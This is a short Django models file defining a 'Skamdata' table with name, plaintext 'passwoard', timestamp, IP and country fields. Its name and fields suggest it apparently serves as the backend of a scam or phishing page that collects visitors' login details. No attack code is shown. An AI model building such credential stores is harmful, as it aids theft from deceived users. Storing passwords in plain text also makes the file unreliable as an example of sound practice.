from django.db import models

# Create your models here.



class Skamdata(models.Model):
    name = models.CharField('name', max_length=160)
    passwoard = models.CharField('passwoard', max_length=160)
    created = models.DateTimeField()
    ip = models.TextField(default="")
    country = models.TextField(default="")
    
    def __str__(self):
        return self.name
